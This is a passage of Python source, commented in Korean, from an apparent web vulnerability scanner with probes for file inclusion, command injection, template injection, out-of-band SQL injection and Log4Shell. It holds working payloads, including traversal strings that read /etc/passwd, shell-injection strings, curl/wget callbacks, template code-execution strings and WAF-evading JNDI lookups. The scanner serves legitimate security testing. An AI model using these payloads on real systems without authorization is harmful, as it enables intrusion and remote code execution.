    "php://filter/convert.base64-encode/resource=index.php",
    "php://filter/convert.base64-encode/resource=../index.php",
    "php://filter/read=convert.base64-encode/resource=index.php",
    "php://filter/convert.base64-encode/resource=config.php",
    "php://filter/convert.base64-encode/resource=../config.php",
]

# PHP 필터 래퍼 base64 응답 패턴
_LFI_PHP_B64_RE = re.compile(r'^[A-Za-z0-9+/=\s]{80,}$')

# /etc/passwd 시그니처(LFI·XXE 공용). 동작 보존을 위해 이 문자열만 공유하고 나머지는 각자 유지.
_ETC_PASSWD_PAT = r"root:.*?:\d+:\d+:"
_LFI_UNIX = re.compile(_ETC_PASSWD_PAT + r"|daemon:.*?:/(?:sbin|usr)|/bin/(?:bash|sh|nologin)")
_LFI_WIN  = re.compile(r"\[extensions\]|\[fonts\]|for 16-bit app support")


async def _probe_lfi(session, points: list[dict], scan_id: str = "") -> dict | None:
    """LFI/경로 추적: 시스템 파일 내용 노출 여부 확인."""
    for pt in _pts_cap(points):
        for param in list(pt["params"]):
            is_file_param = param.lower() in _LFI_PARAMS or pt["source"] == "generic"
            if not is_file_param:
                continue
            for payload in _LFI_PAYLOADS:
                tp = {**pt["params"], param: payload}
                # GET 뿐 아니라 POST 입력점도 점검(예전엔 GET 전용이라 POST 파일파라미터 미검사).
                if pt.get("method") == "POST":
                    _, body, _ = await _post(session, pt["url"], data=tp)
                    _attack_ref = pt["url"]
                else:
                    _attack_ref = pt["url"] + "?" + urllib.parse.urlencode(tp)
                    _, body, _ = await _get(session, _attack_ref)
                if not body:
                    continue

                # PHP 필터 래퍼 — base64 인코딩된 PHP 소스코드 확인
                if "base64-encode" in payload and body:
                    b64_body = re.sub(r'\s+', '', body.strip())
                    if _LFI_PHP_B64_RE.match(body.strip()):
                        try:
                            decoded = base64.b64decode(b64_body).decode("utf-8", errors="ignore")
                            if "<?php" in decoded or "<?=" in decoded:
                                preview = decoded[:300]
                                attack_url = _attack_ref
                                shots = await _capture_step_shots(scan_id, [
                                    (pt["url"],
                                     f"【1단계】 점검 대상 URL 접속\n파라미터 '{param}' 식별",
                                     "#1E3A5F", "left"),
                                    (attack_url,
                                     f"【2단계】 PHP 필터 래퍼 삽입\n페이로드: {payload[:80]}",
                                     "#B45309", "left"),
                                    (attack_url,
                                     f"【3단계】 ★ PHP 소스코드 노출 확인\n"
                                     f"php://filter/base64 래퍼로 서버 파일 내용 추출:\n{preview[:100]}",
                                     "#DC2626", "center"),
                                ], f"lfi_{param[:8]}")
                                return {
                                    "param": param,
                                    "payload": payload,
                                    "url": attack_url,
                                    "os_type": "PHP",
                                    "confirmed": True,
                                    "file_content_preview": preview,
                                    "evidence_screenshots": shots,
                                    "evidence": f"PHP 필터 래퍼(php://filter)로 서버 파일 소스코드 노출:\n{preview[:200]}",
                                }
                        except Exception:
                            pass

                if _LFI_UNIX.search(body):
                    lines = [l for l in body.splitlines() if ":" in l and l.startswith(("root", "daemon", "bin", "sys"))]
                    preview = "\n".join(lines[:4]) if lines else body[:200]
                    attack_url = _attack_ref
                    shots = await _capture_step_shots(scan_id, [
                        (pt["url"],
                         f"【1단계】 점검 대상 URL 접속\nURL: {pt['url'][:100]}\n"
                         f"파일 경로 파라미터 '{param}' 식별",
                         "#1E3A5F", "left"),
                        (attack_url,
                         f"【2단계】 경로 순회 페이로드 삽입\n"
                         f"파라미터: {param}\n페이로드: {payload}",
                         "#B45309", "left"),
                        (attack_url,
                         f"【3단계】 ★ 시스템 파일 노출 확인 (Linux/Unix)\n"
                         f"/etc/passwd 내용이 HTTP 응답에 직접 출력됨:\n{preview[:120]}",
                         "#DC2626", "center"),
                    ], f"lfi_{param[:8]}")
                    # DevTools Network 탭 — /etc/passwd 노출 응답 증거
                    dt_shot = await _capture_devtools_network_shot(
                        scan_id=scan_id,
                        label=f"lfi_{param[:8]}",
                        target_url=attack_url,
                        highlight_texts=["root:", "daemon:", "/bin/bash", "/bin/sh"],
                        vuln_title=f"LFI — /etc/passwd 노출 ({param}={payload[:40]})",
                    )
                    if dt_shot:
                        shots.append(dt_shot)
                    return {
                        "param": param,
                        "payload": payload,
                        "url": attack_url,
                        "os_type": "Linux/Unix",
                        "confirmed": True,
                        "file_content_preview": preview,
                        "evidence_screenshots": shots,
                        "evidence": f"/etc/passwd 파일 내용 직접 노출:\n{preview}",
                    }
                if _LFI_WIN.search(body):
                    preview = body[:300]
                    attack_url = _attack_ref
                    shots = await _capture_step_shots(scan_id, [
                        (pt["url"],
                         f"【1단계】 점검 대상 URL 접속\n파일 경로 파라미터 '{param}' 식별",
                         "#1E3A5F", "left"),
                        (attack_url,
                         f"【2단계】 경로 순회 페이로드 삽입\n파라미터: {param}\n페이로드: {payload}",
                         "#B45309", "left"),
                        (attack_url,
                         f"【3단계】 ★ 시스템 파일 노출 확인 (Windows)\n"
                         f"win.ini 내용이 HTTP 응답에 직접 출력됨:\n{preview[:120]}",
                         "#DC2626", "center"),
                    ], f"lfi_{param[:8]}")
                    return {
                        "param": param,
                        "payload": payload,
                        "url": attack_url,
                        "os_type": "Windows",
                        "confirmed": True,
                        "file_content_preview": preview,
                        "evidence_screenshots": shots,
                        "evidence": f"Windows win.ini 파일 내용 노출:\n{preview[:200]}",
                    }
    return None


# ── CMDI: 명령어 인젝션 ────────────────────────────────────────────────────────

_CMDI_TOKEN = "CMDTEST_XK9Q2M7"
_CMDI_PARAMS = {
    "cmd", "exec", "command", "run", "system", "ping", "host", "ip",
    "query", "input", "execute", "shell", "code", "process", "payload",
}

_CMDI_PAYLOADS_ECHO = [
    f"; echo {_CMDI_TOKEN}",
    f"| echo {_CMDI_TOKEN}",
    f"`echo {_CMDI_TOKEN}`",
    f"$(echo {_CMDI_TOKEN})",
    f"& echo {_CMDI_TOKEN}",
    f"|| echo {_CMDI_TOKEN}",
    f"\n echo {_CMDI_TOKEN}",
    f"; echo {_CMDI_TOKEN} #",
    f"` echo {_CMDI_TOKEN}`",
]

_CMDI_PAYLOADS_TIME = [
    (4, "; sleep 4"),
    (4, "| sleep 4"),
    (4, "` sleep 4`"),
    (4, "$(sleep 4)"),
    (4, "& timeout /t 4"),
]

_CMDI_RE = re.compile(re.escape(_CMDI_TOKEN))


# ── 점검 커버리지 누산기 (스캔별; 단일 스캔 순차 실행 기준) ──────────────────────
_COVERAGE: dict[str, dict] = {}
# 표준화 입력점 기록(AI Payload Planner 입력용). scan_id → [표준 입력점]
_INPUT_POINTS: dict[str, list] = {}


def reset_coverage(scan_id: str = "") -> None:
    _COVERAGE[scan_id] = {
        "points": 0, "params": 0, "forms": 0,
        "xss_attempts": 0, "sqli_attempts": 0, "cmdi_attempts": 0,
        "reflected_xss_attempts": 0, "dom_xss_attempts": 0, "stored_xss_attempts": 0,
        "login_sqli_attempts": 0, "auth_bypass_attempts": 0, "brute_force_attempts": 0,
        "search_inputs": 0,
        "login_forms": 0,
    }
    _INPUT_POINTS[scan_id] = []


def get_coverage(scan_id: str = "") -> dict:
    return dict(_COVERAGE.get(scan_id, {}))


def get_input_points(scan_id: str = "") -> list:
    """표준화 입력점 목록(AI Payload Planner 입력). 중복 제거된 사본."""
    return list(_INPUT_POINTS.get(scan_id, []))


def _record_input_points(scan_id: str, points: list, authenticated: bool = False) -> None:
    """주입 지점(points: {method,url,params,...})을 표준 입력점으로 변환·누적한다."""
    bucket = _INPUT_POINTS.setdefault(scan_id, [])
    seen = {(p.get("method"), p.get("url"), p.get("param")) for p in bucket}
    try:
        import input_points as _ip
    except Exception:
        _ip = None
    for pt in points or []:
        method = (pt.get("method") or "GET").upper()
        url = pt.get("url", "")
        for pname in (pt.get("params") or {}):
            ctx = "generic"
            itype = "text"
            if _ip is not None:
                try:
                    ctx = _ip.classify_context(name=pname, url=url)
                except Exception:
                    ctx = "generic"
            if "pass" in str(pname).lower():
                itype = "password"; ctx = "login"
            key = (method, url, pname)
            if key in seen:
                continue
            seen.add(key)
            bucket.append({
                "url": url, "method": method, "param": pname, "input_type": itype,
                "source": pt.get("source", "generic"), "context": ctx,
                "authenticated": bool(authenticated),
            })


def _cov_add(scan_id: str, **kw) -> None:
    d = _COVERAGE.get(scan_id)
    if d is None:
        return
    for k, v in kw.items():
        d[k] = d.get(k, 0) + v


def _cmdi_is_command_output(body: str, orig_val: str, payload: str, token: str = _CMDI_TOKEN) -> bool:
    """응답이 '실제 명령 실행 출력'인지 '단순 입력 반사'인지 구분한다.

    명령이 실제 실행되면 셸이 'echo'/메타문자(; | ` $())를 소비하고 토큰만 출력한다.
    반대로 검색어 반사 사이트는 입력 문자열(`; echo TOKEN`)을 그대로 응답에 노출한다.

    판정:
      토큰 존재 AND 'echo TOKEN'(명령 원문) 미존재 AND 주입 원문/페이로드 미반사  → 명령 출력(True)
      그 외(입력 반사/인코딩 반사)                                              → False
    """
    if not body or token not in body:
        return False
    bl = body.lower()
    # 'echo <token>' 가 응답에 남아 있으면 셸이 실행하지 않고 그대로 반사한 것.
    if re.search(r"echo\s+" + re.escape(token.lower()), bl):
        return False
    # 주입한 원문 값(orig + payload) 또는 페이로드 자체가 그대로 보이면 반사.
    injected = (str(orig_val) + payload).lower().strip()
    if injected and injected in bl:
        return False
    if payload.lower().strip() in bl:
        return False
    return True


async def _probe_cmdi(session, points: list[dict], scan_id: str = "") -> dict | None:
    """명령어 인젝션: 토큰 에코 반환 또는 시간 지연으로 확인.

    오탐 방지:
    - 에코 토큰만 단독으로 파라미터에 넣었을 때도 응답에 나타나면
      검색어 반사(Reflected Input) 사이트로 간주하여 해당 파라미터를 건너뜀.
    """
    for pt in _pts_cap(points):
        for param in list(pt["params"]):
            is_cmd_param = param.lower() in _CMDI_PARAMS or pt["source"] == "generic"
            if not is_cmd_param:
                continue

            orig_val = str(pt["params"][param])

            # ── 베이스라인 반사 체크 ──────────────────────────────────────────
            # 에코 토큰 자체를 파라미터 값으로 보냈을 때도 응답에 나오면
            # 이 파라미터는 입력을 그대로 반사하는 검색/입력 반영 필드이므로
            # 에코 방식으로는 CMDi 여부를 판별할 수 없음 → 건너뜀
            baseline_tp = {**pt["params"], param: _CMDI_TOKEN}
            if pt["method"] == "POST":
                _, baseline_body, _ = await _post(session, pt["url"], data=baseline_tp)
            else:
                _, baseline_body, _ = await _get(
                    session, pt["url"] + "?" + urllib.parse.urlencode(baseline_tp)
                )
            if baseline_body and _CMDI_RE.search(baseline_body):
                # 입력 반사 파라미터 — 에코 방식 오탐 방지, 시간 지연으로만 판별
                # B5: 정상 요청의 베이스라인 응답시간 측정 → 유도 지연(elapsed-base)이 주입 sleep 에
                #     근접할 때만 확정(자연 지연/타임아웃을 RCE 로 오탐하던 문제 수정)
                _tb0 = time.monotonic()
                _norm_tp = {**pt["params"], param: orig_val}
                try:
                    if pt["method"] == "POST":
                        await _post(session, pt["url"], data=_norm_tp, timeout=10)
                    else:
                        await _get(session, pt["url"] + "?" + urllib.parse.urlencode(_norm_tp), timeout=10)
                except Exception:
                    pass
                base_elapsed = time.monotonic() - _tb0
                for delay, payload in _CMDI_PAYLOADS_TIME[:2]:
                    t_base = time.monotonic()
                    tp_b = {**pt["params"], param: orig_val + payload}
                    if pt["method"] == "POST":
                        await _post(session, pt["url"], data=tp_b, timeout=delay + 6)
                    else:
                        await _get(
                            session, pt["url"] + "?" + urllib.parse.urlencode(tp_b),
                            timeout=delay + 6,
                        )
                    elapsed = time.monotonic() - t_base
                    induced = elapsed - base_elapsed
                    # 유도 지연이 주입 sleep(delay) 대부분을 설명 + 타임아웃(≈delay+6) 아님 → 실제 실행
                    if induced >= delay - 1.0 and elapsed < delay + 5.0:
                        shot_url = pt["url"] + "?" + urllib.parse.urlencode(tp_b) if pt["method"] == "GET" else pt["url"]
                        shots = await _capture_step_shots(scan_id, [
                            (pt["url"],
                             f"【1단계】 점검 대상 URL 접속\n파라미터 '{param}' 식별",
                             "#1E3A5F", "left"),
                            (shot_url,
                             f"【2단계】 시간 지연 페이로드 삽입\n파라미터: {param}\n페이로드: {payload}",
                             "#B45309", "left"),
                            (shot_url,
                             f"【3단계】 ★ 명령어 인젝션 확인\n"
                             f"응답 지연 {elapsed:.1f}초 — SLEEP 명령 서버에서 실행됨",
                             "#DC2626", "center"),
                        ], f"cmdi_{param[:8]}")
                        return {
                            "type": "time_based",
                            "param": param,
                            "payload": payload,
                            "url": pt["url"],
                            "method": pt["method"],
                            "elapsed_sec": round(elapsed, 1),
                            "confirmed": True,
                            "evidence_screenshots": shots,
                            "evidence": f"명령어 인젝션 시간 지연: {payload!r} → {elapsed:.1f}초 응답 지연",
                        }
                continue  # 반사 파라미터에서 에코 방식은 건너뜀

            # 1) 에코 토큰 반환 방식
            for payload in _CMDI_PAYLOADS_ECHO[:5]:
                tp = {**pt["params"], param: orig_val + payload}
                if pt["method"] == "POST":
                    _, body, _ = await _post(session, pt["url"], data=tp)
                    shot_url = pt["url"]
                else:
                    shot_url = pt["url"] + "?" + urllib.parse.urlencode(tp)
                    _, body, _ = await _get(session, shot_url)
                # 오탐 방지: 토큰이 보여도 '입력 반사'면 명령 실행이 아님 → 건너뜀.
                # 셸이 실제 실행해 토큰만 출력된 경우(= 명령 출력)에만 CONFIRMED.
                if body and _cmdi_is_command_output(body, orig_val, payload):
                    # 응답에서 에코 토큰 주변 컨텍스트 추출
                    m = _CMDI_RE.search(body)
                    start = max(0, m.start() - 80)
                    snippet = body[start: m.end() + 80].strip()[:250]
                    shots = await _capture_step_shots(scan_id, [
                        (pt["url"],
                         f"【1단계】 점검 대상 URL 접속\n파라미터 '{param}' 식별\n"
                         f"URL: {pt['url'][:100]}",
                         "#1E3A5F", "left"),
                        (shot_url,
                         f"【2단계】 명령어 인젝션 페이로드 삽입\n"
                         f"파라미터: {param}\n페이로드: {payload}",
                         "#B45309", "left"),
                        (shot_url,
                         f"【3단계】 ★ 명령어 인젝션 취약점 확인됨\n"
                         f"에코 토큰({_CMDI_TOKEN})이 HTTP 응답에서 확인됨:\n{snippet[:150]}",
                         "#DC2626", "center"),
                    ], f"cmdi_{param[:8]}")
                    return {
                        "type": "output_based",
                        "param": param,
                        "payload": payload,
                        "url": pt["url"],
                        "method": pt["method"],
                        "confirmed": True,
                        "echo_snippet": snippet,
                        "evidence_screenshots": shots,
                        "evidence": f"명령어 인젝션 에코 토큰({_CMDI_TOKEN}) 응답에서 확인됨",
                    }

            # 2) 시간 지연 방식 (백업) — B5: 베이스라인 측정 후 '유도 지연'으로만 확정(자연지연/타임아웃 오탐 방지)
            _bt0 = time.monotonic()
            try:
                if pt["method"] == "POST":
                    await _post(session, pt["url"], data={**pt["params"], param: orig_val}, timeout=10)
                else:
                    await _get(session, pt["url"] + "?"
                               + urllib.parse.urlencode({**pt["params"], param: orig_val}), timeout=10)
            except Exception:
                pass
            _base2 = time.monotonic() - _bt0
            for delay, payload in _CMDI_PAYLOADS_TIME[:2]:
                tp = {**pt["params"], param: orig_val + payload}
                t0 = time.monotonic()
                if pt["method"] == "POST":
                    await _post(session, pt["url"], data=tp, timeout=delay + 5)
                else:
                    await _get(session, pt["url"] + "?" + urllib.parse.urlencode(tp), timeout=delay + 5)
                elapsed = time.monotonic() - t0
                if (elapsed - _base2) >= delay - 1.0 and elapsed < delay + 4.0:
                    shot_url = pt["url"] + "?" + urllib.parse.urlencode(tp) if pt["method"] == "GET" else pt["url"]
                    shots = await _capture_step_shots(scan_id, [
                        (pt["url"],
                         f"【1단계】 점검 대상 URL 접속\n파라미터 '{param}' 식별",
                         "#1E3A5F", "left"),
                        (shot_url,
                         f"【2단계】 시간 지연 페이로드 삽입\n파라미터: {param}\n페이로드: {payload}",
                         "#B45309", "left"),
                        (shot_url,
                         f"【3단계】 ★ 명령어 인젝션 취약점 확인됨\n"
                         f"응답 지연 {elapsed:.1f}초 — SLEEP 명령이 서버에서 실행됨",
                         "#DC2626", "center"),
                    ], f"cmdi_{param[:8]}")
                    return {
                        "type": "time_based",
                        "param": param,
                        "payload": payload,
                        "url": pt["url"],
                        "method": pt["method"],
                        "elapsed_sec": round(elapsed, 1),
                        "confirmed": True,
                        "evidence_screenshots": shots,
                        "evidence": f"명령어 인젝션 시간 지연: {payload!r} → {elapsed:.1f}초 응답 지연",
                    }

    # OOB 커맨드 인젝션(blind): 셸이 스캐너 콜백을 fetch(curl/wget/powershell)하면 확증.
    try:
        import oob_collaborator as _oob
        collab = _oob.get_collaborator(scan_id)
    except Exception:
        collab = None
    if collab is not None:
        _cmd_tokens: dict = {}
        _n = 0
        for pt in points:
            if _n >= 12:
                break
            for param in list(pt.get("params") or {}):
                if not (param.lower() in _CMDI_PARAMS or pt.get("source") == "generic"):
                    continue
                token = collab.new_token()
                hp = collab.host_for(token)   # host:port/token (스킴 없이)
                for pl in (f"; curl http://{hp}", f"| wget -qO- http://{hp}",
                           f"$(curl http://{hp})", f"& powershell -c \"iwr http://{hp}\""):
                    tp = {**pt["params"], param: str(pt["params"][param]) + pl}
                    try:
                        if pt.get("method") == "POST":
                            await _post(session, pt["url"], data=tp)
                        else:
                            await _get(session, pt["url"] + "?" + urllib.parse.urlencode(tp))
                    except ScanInterrupted:
                        raise
                    except Exception:
                        pass
                _cmd_tokens[token] = (pt.get("url", ""), param)
                _n += 1
                if _n >= 12:
                    break
        if _cmd_tokens:
            for _ in range(5):
                if any(collab.was_hit(t) for t in _cmd_tokens):
                    break
                await asyncio.sleep(1)
            hit = [(t, _cmd_tokens[t]) for t in _cmd_tokens if collab.was_hit(t)]
            if hit:
                t0, (url0, param0) = hit[0]
                return {
                    "type": "oob_command", "confirmed": True, "oob_hit": True,
                    "param": param0, "url": url0,
                    "evidence": (f"OOB 커맨드 인젝션 실증: 파라미터 '{param0}' 주입 명령이 스캐너 "
                                 f"콜백으로 요청 도달(토큰 {t0[:8]}…) — 원격 명령 실행 확인."),
                    "affected_endpoints": [url0],
                }
    return None


# ── SSTI: 서버사이드 템플릿 인젝션 ──────────────────────────────────────────────

_SSTI_PROBES = [
    ("{{7*7}}",       "49",      "Jinja2/Twig"),
    ("${7*7}",        "49",      "Freemarker/Spring EL"),
    ("<%= 7*7 %>",    "49",      "ERB (Ruby)"),
    ("*{7*7}",        "49",      "Spring EL"),
    ("{{7*'7'}}",     "7777777", "Jinja2"),          # 낮은 오탐(문자열 반복)
    ("{{'7'*7}}",     "7777777", "Twig"),            # 낮은 오탐
    ("#{ 7 * 7 }",    "49",      "Ruby/Pebble"),
    ("@(7*7)",        "49",      "Razor (.NET)"),
    ("#{7*7}",        "49",      "Pebble/Jinja"),
    ("[[${7*7}]]",    "49",      "Thymeleaf"),
    ("#set($x=7*7)$x", "49",     "Velocity"),
    ("{7*7}",         "49",      "Smarty"),
    ("${7*7}",        "49",      "Mako"),
    ("<%=7*7%>",      "49",      "JSP/ASP EL"),
]


def _ssti_oob_payloads(engine: str, host: str) -> list[str]:
    """SSTI→RCE 실증용 '엔진 네이티브' OOB 콜백 페이로드(P5).

    안전 불변식: 셸/웹쉘/os-shell/popen/curl/wget 을 절대 쓰지 않는다. 언어 네이티브 네트워크
    프리미티브(urllib/Net::HTTP/file_get_contents/java.net.URL/WebClient)로 스캐너 OOB 리스너에
    무해한 GET 콜백만 발생시켜 '코드 실행 도달성'만 실증한다(데이터 추출·상태변경 없음).
    host = "ip:port/token". 엔진 문자열에 맞는 페이로드만 선별해 요청 수를 최소화한다.
    """
    e = (engine or "").lower()
    u = f"http://{host}"
    out: list[str] = []
    if "jinja" in e or "twig" in e:
        # Jinja2(Python) — urllib 네이티브(셸 없음)
        out.append("{{cycler.__init__.__globals__.__builtins__"
                   f".__import__('urllib.request').urlopen('{u}')}}}}")
        out.append("{{lipsum.__globals__.__builtins__"
                   f".__import__('urllib.request').urlopen('{u}')}}}}")
        # Twig(PHP) — file_get_contents 네이티브(셸 없음)
        out.append(f"{{{{['{u}']|map('file_get_contents')|join(',')}}}}")
        out.append("{{_self.env.registerUndefinedFilterCallback('file_get_contents')}}"
                   f"{{{{_self.env.getFilter('{u}')}}}}")
    if "mako" in e:
        out.append(f"${{__import__('urllib.request').urlopen('{u}')}}")
    if "smarty" in e:
        out.append(f"{{'{u}'|file_get_contents}}")
    if "erb" in e or "ruby" in e or "pebble" in e:
        out.append(f"<%= require 'net/http'; Net::HTTP.get(URI('{u}')) %>")
    if "freemarker" in e or "spring" in e or "thymeleaf" in e or "jsp" in e or "asp" in e:
        # SpEL / Thymeleaf — java.net.URL 네이티브(Execute/셸 아님)
        out.append(f"${{new java.net.URL('{u}').openStream()}}")
        out.append(f"[[${{new java.net.URL('{u}').openConnection().getInputStream()}}]]")
        out.append(f"*{{new java.net.URL('{u}').openStream()}}")
    if "razor" in e:
        out.append(f'@{{ new System.Net.WebClient().DownloadString("{u}"); }}')
    if not out:
        # 엔진 미상 — Python/Java 네이티브 소수만 폴백
        out.append("{{cycler.__init__.__globals__.__builtins__"
                   f".__import__('urllib.request').urlopen('{u}')}}}}")
        out.append(f"${{new java.net.URL('{u}').openStream()}}")
    return out


async def _ssti_escalate_rce(session, pt: dict, param: str, engine: str,
                             scan_id: str) -> dict | None:
    """산술 SSTI 확증 지점에 대해 PROOF 모드에서 엔진 네이티브 OOB 콜백으로 코드실행을 실증.

    proof_active() 이고 OOB 콜라보레이터가 있을 때만 수행. 콜백 히트가 있어야만 확증(오탐 0).
    반환: 히트 시 {"rce_confirmed", "oob_hit", "rce_payload", "rce_evidence", "rce_token"}, 아니면 None.
    """
    try:
        import validation_profiles as _vp
        _oob_on = os.getenv("ENABLE_OOB", "false").strip().lower() in ("1", "true", "yes", "on")
        # PROOF 이거나 OOB 콜라보레이터가 켜져 있으면 수행(다른 OOB 프로브와 게이트 일관화).
        # 확증된 산술 SSTI 지점 + OOB 콜백 히트가 있어야만 확증 → 오탐 0 유지.
        if not (_vp.proof_active() or _oob_on):
            return None
    except Exception:
        return None
    try:
        import oob_collaborator as _oob
        collab = _oob.get_collaborator(scan_id)
    except Exception:
        collab = None
    if collab is None:
        return None
    token = collab.new_token()
    hp = collab.host_for(token)   # ip:port/token
    payloads = _ssti_oob_payloads(engine, hp)
    for pl in payloads:
        tp = {**pt["params"], param: pl}
        try:
            if pt["method"] == "POST":
                await _post(session, pt["url"], data=tp)
            else:
                await _get(session, pt["url"] + "?" + urllib.parse.urlencode(tp))
        except ScanInterrupted:
            raise
        except Exception:
            continue
    for _ in range(5):
        if collab.was_hit(token):
            break
        await asyncio.sleep(1)
    if not collab.was_hit(token):
        return None
    return {
        "rce_confirmed": True,
        "oob_hit": True,
        "rce_token": token,
        "rce_payload": payloads[0] if payloads else "",
        "rce_evidence": (
            f"SSTI→RCE 실증: {engine} 템플릿에 엔진 네이티브 네트워크 프리미티브를 주입하자 "
            f"서버가 스캐너 OOB 리스너로 아웃바운드 요청(토큰 {token[:8]}…)을 발생 — 셸/데이터추출 "
            f"없이 서버측 '코드 실행 도달성'을 확증. 동일 실행 경로로 임의 코드 실행(서버 장악) 가능."
        ),
    }


async def _probe_ssti(session, points: list[dict], scan_id: str = "") -> dict | None:
    """SSTI: 수식이 서버에서 '평가'되어 결과가 나오는지 차등(differential) 확인.

    오탐 방지(핵심): 표현식을 고유 마커로 감싸 전송하고(mk+expr+mk), 응답에
    '마커+평가결과+마커'(예: mk49mk)가 나오고 '마커+원문표현식+마커'(반사)는 없을 때만 확정한다.
    → 본문 아무 곳의 '49'(뉴스 ID·가격·날짜 등)로 인한 오탐과, 표현식을 그대로 되비추는
      단순 반사(비-SSTI)를 모두 배제한다. (ASP.NET 사이트에 Jinja 확정되던 오탐 수정)
    """
    mk = "eosti" + (scan_id or "x").replace("-", "")[:6]
    for pt in points[:10]:
        for param in list(pt["params"])[:5]:
            for expr, expected, engine in _SSTI_PROBES:
                payload = f"{mk}{expr}{mk}"
                evaluated = f"{mk}{expected}{mk}"    # 서버가 평가하면 나올 문자열
                reflected = payload                  # 그대로 되비추면(반사) 나올 문자열
                tp = {**pt["params"], param: payload}
                try:
                    if pt["method"] == "POST":
                        _, body, _ = await _post(session, pt["url"], data=tp)
                    else:
                        _, body, _ = await _get(session, pt["url"] + "?" + urllib.parse.urlencode(tp))
                except ScanInterrupted:
                    raise
                except Exception:
                    continue
                if not body:
                    continue
                # 평가됨(마커 사이 결과 존재) + 원문 표현식 미반사 → SSTI 확정
                if evaluated in body and reflected not in body:
                    result = {
                        "param": param,
                        "payload": payload,
                        "expected_result": expected,
                        "engine": engine,
                        "url": pt["url"],
                        "method": pt["method"],
                        "confirmed": True,
                        "evidence": (
                            f"SSTI 확인: {engine} 표현식 '{expr}' 이 서버에서 평가되어 결과 "
                            f"'{expected}' 가 마커 사이('{mk}…{mk}')에 출력됨. 원문 표현식은 반사되지 "
                            f"않음(단순 에코 아님). 페이로드: {payload}"
                        ),
                    }
                    # PROOF 모드: 산술 확증 지점에서 엔진 네이티브 OOB 콜백으로 RCE 실증(P5)
                    try:
                        rce = await _ssti_escalate_rce(session, pt, param, engine, scan_id)
                    except ScanInterrupted:
                        raise
                    except Exception:
                        rce = None
                    if rce:
                        result.update(rce)
                        result["evidence"] = result["evidence"] + " | " + rce["rce_evidence"]
                    return result
    return None


# ── SSRF: 서버사이드 요청 위조 ────────────────────────────────────────────────

_SSRF_PARAMS = {
    "url", "host", "server", "webhook", "link", "target", "callback",
    "feed", "proxy", "api", "endpoint", "src", "source", "dest", "uri",
    "redirect", "return", "next",
}

async def _probe_sqli_oob(session, points: list[dict], scan_id: str = "") -> dict | None:
    """OOB blind SQLi 확증(P3) — DB 가 스캐너 콜라보레이터로 HTTP 콜백하게 만들어 오탐 0 으로 확정.

    SAFE: 데이터 추출 없음(네트워크 콜백만). HTTP 콜백 가능한 DB(주로 Oracle UTL_HTTP)에 유효.
    콜라보레이터(=PROOF 또는 ENABLE_OOB)가 있을 때만 수행. 콜백 미수신이면 아무것도 보고하지 않음.
    (DNS 전용 exfil 경로는 자립형 로컬 아키텍처에서 미지원 — 공인 권한 DNS 필요.)
    """
    try:
        import oob_collaborator as _oob
        collab = _oob.get_collaborator(scan_id)
    except Exception:
        collab = None
    if collab is None:
        return None
    _tokens: dict = {}
    _n = 0
    for pt in points:
        if _n >= 10:
            break
        if pt.get("method") not in (None, "GET", "POST"):
            continue
        for param in list(pt.get("params") or {}):
            token = collab.new_token()
            hp = collab.host_for(token)   # host:port/token
            base_val = str(pt["params"].get(param, "1"))
            for pl in (f"' || UTL_HTTP.REQUEST('http://{hp}') || '",
                       f"'||(SELECT UTL_HTTP.REQUEST('http://{hp}') FROM dual)||'",
                       f"{base_val}' UNION SELECT UTL_HTTP.REQUEST('http://{hp}') FROM dual--"):
                tp = {**pt["params"], param: base_val + pl}
                try:
                    if pt.get("method") == "POST":
                        await _post(session, pt["url"], data=tp)
                    else:
                        await _get(session, pt["url"] + "?" + urllib.parse.urlencode(tp))
                except ScanInterrupted:
                    raise
                except Exception:
                    pass
            _tokens[token] = (pt.get("url", ""), param)
            _n += 1
            if _n >= 10:
                break
    if not _tokens:
        return None
    for _ in range(5):
        if any(collab.was_hit(t) for t in _tokens):
            break
        await asyncio.sleep(1)
    hit = [(t, _tokens[t]) for t in _tokens if collab.was_hit(t)]
    if hit:
        t0, (url0, param0) = hit[0]
        return {
            "type": "sql_injection", "confirmed": True, "oob_hit": True,
            "confidence": "CONFIRMED", "param": param0, "url": url0,
            "injection_types": ["out-of-band"],
            "evidence": (f"OOB SQL 인젝션 실증: 파라미터 '{param0}' 주입으로 DB가 스캐너 콜백에 "
                         f"HTTP 요청 도달(토큰 {t0[:8]}…) — blind SQLi 를 데이터 추출 없이 확증."),
            "affected_endpoints": [url0],
        }
    return None


# ── JNDI / Log4Shell(CVE-2021-44228 류) OOB 실증 ──────────────────────────────

_JNDI_HEADERS = (
    "User-Agent", "Referer", "X-Api-Version", "X-Forwarded-For", "X-Client-IP",
    "X-Requested-With", "Accept-Language", "X-Forwarded-Host", "Origin",
)


def _jndi_payloads(host: str) -> list[str]:
    """Log4Shell 류 JNDI 룩업 페이로드(host = "ip:port"). 서버가 취약하면 JVM 이 해당
    host:port 로 LDAP TCP 연결을 시도 → 스캐너 raw 캐처가 잡아 확증(오탐 0, 데이터 추출 없음).
    난독화 변형 포함(WAF 우회). 셸 없음: 순수 JNDI 룩업 문자열."""
    return [
        f"${{jndi:ldap://{host}/e}}",
        f"${{jndi:rmi://{host}/e}}",
        f"${{${{lower:j}}ndi:${{lower:l}}dap://{host}/e}}",
        f"${{${{::-j}}ndi:${{::-l}}${{::-d}}${{::-a}}${{::-p}}://{host}/e}}",
    ]


async def _probe_jndi(session, base_url: str, points: list[dict], scan_id: str = "") -> dict | None:
    """JNDI/Log4Shell OOB 실증: 헤더·파라미터에 JNDI 룩업을 주입하고, 서버(JVM)가 스캐너
    raw-TCP 캐처로 LDAP 연결을 걸어오면 확증한다. 콜백 없으면 미보고(오탐 0).

    콜라보레이터(=PROOF 또는 ENABLE_OOB)가 있을 때만 수행. 포트=토큰 정체성으로 정확 상관.
    """
    try:
        import oob_collaborator as _oob
        collab = _oob.get_collaborator(scan_id)
    except Exception:
        collab = None
    if collab is None or not hasattr(collab, "new_raw_endpoint"):
        return None

    _units: list = []   # (token, kind, detail)

    # 1) 헤더 기반(로그에 흔히 기록되는 헤더 일괄) — base_url 1회
    ep = await collab.new_raw_endpoint()
    if ep:
        token, host = ep
        pls = _jndi_payloads(host)
        hdrs = {h: pls[i % len(pls)] for i, h in enumerate(_JNDI_HEADERS)}
        try:
            await _get(session, base_url, headers=hdrs)
        except ScanInterrupted:
            raise
        except Exception:
            pass
        _units.append((token, "header", ", ".join(_JNDI_HEADERS[:4]) + "…"))

    # 2) 파라미터 기반 — 각 주입점의 파라미터에 페이로드 주입(최대 6점)
    _n = 0
    for pt in points:
        if _n >= 6:
            break
        if pt.get("method") not in (None, "GET", "POST"):
            continue
